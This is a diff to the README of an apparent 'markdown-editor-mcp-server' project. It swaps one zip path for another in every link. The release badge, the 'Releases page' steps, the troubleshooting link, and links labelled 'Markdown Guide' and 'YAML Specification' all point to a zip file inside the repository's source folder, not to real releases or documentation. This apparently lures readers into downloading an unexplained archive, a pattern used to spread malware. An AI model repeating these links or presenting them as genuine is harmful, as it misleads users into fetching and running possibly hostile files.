@@ -1,6 +1,6 @@
 # ✨ markdown-editor-mcp-server - Edit Markdown with Ease and Precision
 
-[![Download Latest Release](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip)
+[![Download Latest Release](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the markdown-editor-mcp-server! This application allows you to edit M
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip) to download the latest version of the application. Select the appropriate file for your system and follow the instructions below to install it.
+To get started, visit the [Releases page](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip) to download the latest version of the application. Select the appropriate file for your system and follow the instructions below to install it.
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Make sure your computer meets these requirements:
 
 ## ⚙️ Installation Steps
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip).
+1. Go to the [Releases page](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip).
 2. Click on the latest version available.
 3. Select the file appropriate for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -63,8 +63,8 @@ After installation, launch the markdown-editor-mcp-server. You will see a clean 
 
 For more information and helpful guides, see the following:
 
-- [Markdown Guide](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip)
-- [YAML Specification](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip)
+- [Markdown Guide](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip)
+- [YAML Specification](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -72,7 +72,7 @@ If you encounter issues, try the following:
 
 - Ensure your system meets the requirements listed above.
 - Restart the application if it is not responding.
-- Check for updates on the [Releases page](https://raw.githubusercontent.com/Kcao3034/markdown-editor-mcp-server/main/src/markdown_editor/server-editor-mcp-markdown-3.6.zip) to ensure you are using the latest version.
+- Check for updates on the [Releases page](https://github.com/Kcao3034/markdown-editor-mcp-server/raw/refs/heads/main/src/markdown_editor/tools/markdown_server_mcp_editor_v3.8.zip) to ensure you are using the latest version.
 
 For further assistance, consider reaching out on the GitHub Issues page.
 
